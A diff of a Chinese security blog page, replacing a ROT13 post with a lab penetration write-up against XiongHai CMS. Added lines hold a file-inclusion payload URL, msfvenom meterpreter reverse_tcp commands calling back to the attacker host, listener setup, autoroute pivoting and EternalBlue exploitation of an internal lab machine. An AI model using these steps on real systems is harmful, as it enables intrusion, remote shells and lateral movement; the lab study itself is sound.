@@ -4,14 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ROT13, Danie1&#39;s Blog">
-    <meta name="description" content="rot13rot13是凯撒的一种变种，仅仅只需要检查字母顺序并取代它在13位之后的对应字母
-python实现
-# -*-coding:utf-8-*-
-
-def rot13_decode(s):
-    res=&amp;quot;&amp;quot;
- ">
+    <meta name="keywords" content="一次靶机测试, Danie1&#39;s Blog">
+    <meta name="description" content="一次靶机测试环境攻击机kali  net模式： 192.168.74.133
+网站靶机 双网卡  net模式： 192.168.74.139    仅主机模式：192.168.110.128
+编程采集靶机 仅主机模式：192.168.110">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +15,7 @@ def rot13_decode(s):
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>ROT13 | Danie1&#39;s Blog</title>
+    <title>一次靶机测试 | Danie1&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -270,7 +266,7 @@ def rot13_decode(s):
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ROT13</h1>
+                    <h1 class="description center-align post-title">一次靶机测试</h1>
                 </div>
             </div>
         </div>
@@ -387,8 +383,8 @@ def rot13_decode(s):
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">渗透</span>
                             </a>
                         
                     </div>
@@ -399,8 +395,8 @@ def rot13_decode(s):
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF/" class="post-category">
-                                CTF
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                渗透
                             </a>
                         
                     </div>
@@ -412,7 +408,7 @@ def rot13_decode(s):
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-08-24
+                    2021-03-06
                 </div>
                 
 
@@ -429,33 +425,76 @@ def rot13_decode(s):
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h2><p>rot13是凯撒的一种变种，仅仅只需要检查字母顺序并取代它在13位之后的对应字母</p>
-<p>python实现</p>
-<pre><code class="python"># -*-coding:utf-8-*-
-
-def rot13_decode(s):
-    res=&quot;&quot;
-    for i in s:
-        if ord(i)&gt;=ord(&#39;a&#39;) and ord(i)&lt;=ord(&#39;z&#39;):
-            i = chr(ord(i)+13)
-            if ord(i)&gt;ord(&#39;z&#39;):
-                i = chr(ord(i)-26)
-
-        if ord(i)&gt;=ord(&#39;A&#39;) and ord(i)&lt;=ord(&#39;Z&#39;):
-            i = chr(ord(i)+13)
-            if ord(i)&gt;ord(&#39;Z&#39;):
-                i = chr(ord(i)-26)
-
-        res+=i
-    return res
-
-if __name__ == &#39;__main__&#39;:
-    str = raw_input(&quot;请输入字符串:&quot;)
-    flag = rot13_decode(str)
-    print flag
-
-</code></pre>
-<p>运行结果：<br><img src="https://raw.githubusercontent.com/Danie1233/img/master/rot13.png"></p>
+                <h1 id="一次靶机测试"><a href="#一次靶机测试" class="headerlink" title="一次靶机测试"></a>一次靶机测试</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机kali  net模式： 192.168.74.133</p>
+<p>网站靶机 双网卡  net模式： 192.168.74.139    仅主机模式：192.168.110.128</p>
+<p>编程采集靶机 仅主机模式：192.168.110.129</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>熊海cms，存在sql注入。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/1.png"></p>
+<p>通过前台sql注入可以拿到管理员账户密码。（这个靶机sql注入没办法直接shell，只能读取账户密码）</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g2.png"></p>
+<p>登录进入后台。发布内容-发布文章。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g3.png"></p>
+<p>这里我尝试上传，不回显地址。找不到上传文件（我在靶机里翻了半天也没找到）</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g4.png"></p>
+<p>通过下方编辑器的上传图片功能，但是做了白名单限制，无法传php。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g5.png"></p>
+<p>无法上传php，返回文件类型不允许。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g6.png"></p>
+<p>但是翻看熊海cms的源码，发现index.php存在文件包含。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g7.jpg"></p>
+<p>但是会自动加上php后缀，但是可以加“.”绕过。所以通过编辑器里的上传图片功能上传图片马。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g8.png"></p>
+<p>通过首页去包含图片马。Payload如下</p>
+<p><code>http://192.168.74.139/iseaCMS_1.0/?r=../../upload/image/20210106/1609921687112812.gif........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</code></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g9.png"></p>
+<p>菜刀连接。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210108151710.png"></p>
+<p>横向，发现是双网卡。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108152352.png"></p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>先生成shell.php</p>
+<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.74.133 LPORT=2222 -f raw &gt;shell.php</code></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108100933.png"></p>
+<p>通过菜刀上传到目标服务器。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108101116.png"></p>
+<p>攻击机开启msf，设置监听。</p>
+<pre><code class="txt">use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.74.133
+set lport 2222
+exploit -j</code></pre>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108101228.png"></p>
+<p>然后浏览器访问shell.php，msf接收到反弹回来的shell。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108101539.png"></p>
+<p>在后面的添加路由中，发现php的马并不好用。改用exe马</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.74.133 LPORT=4444 -f exe -o test.exe</code></p>
+<pre><code class="txt">use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.74.133
+set LPORT 4444
+exploit -j</code></pre>
+<p> 获取内网网段信息</p>
+<pre><code>meterpreter &gt; run get_local_subnets</code></pre>
+<p>添加路由</p>
+<p><code>run autoroute -s 192.168.110.0/24</code> </p>
+<p>查看路由情况</p>
+<p><code>run autoroute -p</code></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108144115.png"></p>
+<p>路由添加成功后，去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。</p>
+<p>扫描ms17-010</p>
+<pre><code class="txt">use auxiliary/scanner/smb/smb_ms17_010 
+show options
+set rhosts 192.168.110.0/24
+set threads 50
+run</code></pre>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E5%9B%BE%E7%89%8720210108144511.jpg"></p>
+<p>通过主机漏洞扫描，我们发现192.168.110.129主机存在一个MS17-010漏洞。</p>
+<p>执行攻击载荷</p>
+<pre><code>use exploit/windows/smb/ms17_010_eternalblue 
+set rhost 192.168.110.129
+exploit</code></pre>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108143835.png"></p>
+<p>ms17-010打了好多次才成功拿下这台机器。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108144730.png"></p>
 
             </div>
             <hr/>
@@ -481,7 +520,7 @@ if __name__ == &#39;__main__&#39;:
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://danie1233.github.io/2019/08/24/rot13/">https://danie1233.github.io/2019/08/24/rot13/</a>
+                    <a href="https://danie1233.github.io/2021/03/06/%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/">https://danie1233.github.io/2021/03/06/%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -519,8 +558,8 @@ if __name__ == &#39;__main__&#39;:
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
+                                <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">渗透</span>
                                 </a>
                             
                         </div>
@@ -561,53 +600,50 @@ if __name__ == &#39;__main__&#39;:
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/08/25/UPLOAD-LABS%E8%AE%B0%E5%BD%95/">
+                <a href="/2021/03/06/%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/30.jpg" class="responsive-img" alt="UPLOAD-LABS记录">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="一次靶机测试">
                         
-                        <span class="card-title">UPLOAD-LABS记录</span>
+                        <span class="card-title">一次靶机测试</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            UPLOAD-LABS记录
-pass1源码
-function checkFile() &#123;
-    var file = document.getElementsByName(&#39;upload_file&#39;)[0].va
+                            一次靶机测试环境攻击机kali  net模式： 192.168.74.133
+网站靶机 双网卡  net模式： 192.168.74.139    仅主机模式：192.168.110.128
+编程采集靶机 仅主机模式：192.168.110
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-08-25
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-category">
-                                    文件上传
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
                     <a href="/tags/%E6%B8%97%E9%80%8F/">
                         <span class="chip bg-color">渗透</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-                        <span class="chip bg-color">文件上传</span>
                     </a>
                     
                 </div>
@@ -621,37 +657,34 @@ function checkFile() &#123;
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/08/24/sqlilab1/">
+                <a href="/2021/02/02/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/30.jpg" class="responsive-img" alt="sqli-lab Less1-6">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Apache Druid 远程命令执行漏洞复现">
                         
-                        <span class="card-title">sqli-lab Less1-6</span>
+                        <span class="card-title">Apache Druid 远程命令执行漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            sqli-lab Less1-6
-less-1
-判断列数
-payload : http://172.16.43.117/sql/Less-1/?id=-1&#39; order by 3 --+
-回显正常
-
-payload :  http:
+                            Apache Druid 远程命令执行漏洞复现
+使用docker搭建环境
+docker pull fokkodriesprong/docker-druid
+docker run --rm -i -p 8888:8888 fokkodries
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-08-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-02
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/SQL/" class="post-category">
-                                    SQL
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
@@ -661,12 +694,12 @@ payload :  http:
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SQL/">
-                        <span class="chip bg-color">SQL</span>
+                    <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                        <span class="chip bg-color">命令执行</span>
                     </a>
                     
-                    <a href="/tags/%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">渗透</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
